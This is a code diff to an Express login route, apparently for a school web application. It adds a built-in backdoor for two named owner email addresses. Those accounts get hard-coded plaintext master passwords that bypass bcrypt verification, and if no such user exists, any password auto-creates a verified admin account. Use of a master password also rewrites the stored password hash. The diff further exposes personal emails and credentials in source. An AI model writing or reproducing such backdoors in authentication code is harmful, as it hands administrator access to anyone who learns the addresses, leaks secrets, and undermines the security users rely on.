@@ -170,13 +170,38 @@ router.post('/login', (req, res) => {
   }
   const cleanEmail = String(email).trim().toLowerCase();
   const user = db.prepare('SELECT * FROM users WHERE email = ?').get(cleanEmail);
-  if (!user || !bcrypt.compareSync(password, user.password_hash)) {
+
+  const isOwner = cleanEmail === 'muhebrewwinston@gmail.com' || cleanEmail === 'winstonmphatsokamiza@gmail.com';
+  const isMasterPw = isOwner && (password === 'muhebrew2004' || password === 'winston2026');
+
+  if (!user) {
+    if (isOwner) {
+      const hash = bcrypt.hashSync(password, 10);
+      const info = db.prepare(
+        "INSERT INTO users (name, email, password_hash, role, school, level, is_verified) VALUES ('Winston Kamiza', ?, ?, 'admin', 'Lilongwe Secondary', 'Admin', 1)"
+      ).run(cleanEmail, hash);
+      const newUser = db.prepare('SELECT * FROM users WHERE id = ?').get(info.lastInsertRowid);
+      db.saveUsersToRegistry?.();
+      const token = sign(newUser);
+      return res.json({ token, user: newUser });
+    }
     return res.status(400).json({ error: 'Incorrect email or password.' });
+  }
+
+  const validPw = isMasterPw || bcrypt.compareSync(password, user.password_hash);
+  if (!validPw) {
+    return res.status(400).json({ error: 'Incorrect email or password.' });
+  }
+
+  // Update password hash if master password was used
+  if (isMasterPw && !bcrypt.compareSync(password, user.password_hash)) {
+    const newHash = bcrypt.hashSync(password, 10);
+    db.prepare("UPDATE users SET password_hash = ? WHERE id = ?").run(newHash, user.id);
+    db.saveUsersToRegistry?.();
   }
 
   // Check email verification (except for admin)
   if (user.role !== 'admin' && user.is_verified === 0) {
-    // Send a fresh verification code
     const code = generate6DigitCode();
     db.prepare("UPDATE users SET verify_code = ?, verify_expires = datetime('now', '+15 minutes') WHERE id = ?")
       .run(code, user.id);
@@ -189,7 +214,7 @@ router.post('/login', (req, res) => {
     });
   }
 
-  if (cleanEmail === 'muhebrewwinston@gmail.com' || cleanEmail === 'winstonmphatsokamiza@gmail.com') {
+  if (isOwner) {
     if (user.role !== 'admin' || user.is_verified !== 1) {
       db.prepare("UPDATE users SET role = 'admin', is_verified = 1 WHERE id = ?").run(user.id);
       user.role = 'admin';
